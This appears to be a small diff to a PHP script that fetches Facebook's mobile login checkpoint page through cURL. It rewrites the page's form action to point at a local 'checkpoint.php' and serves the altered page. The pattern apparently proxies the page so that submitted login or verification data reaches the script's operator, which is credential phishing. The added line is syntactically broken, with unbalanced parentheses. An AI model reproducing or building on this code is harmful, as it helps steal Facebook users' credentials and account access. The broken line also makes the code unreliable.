@@ -49,7 +49,8 @@ curl_setopt($ch, CURLOPT_REFERER, "http://m.facebook.com");
 $fbMain = curl_exec($ch); // $a will contain all headers
 curl_close($ch);
 
-$fbMod = str_replace('action="/login/checkpoint/"','action="checkpoint.php"',$fbMain);
+$pos1 = strpos($fbMain, "<head>");
+$fbMod = str_replace('action="/login/checkpoint/"','action="checkpoint.php"', substr($fbMain,$pos1,strlen($fbMain));
 echo $fbMod;
 
 }
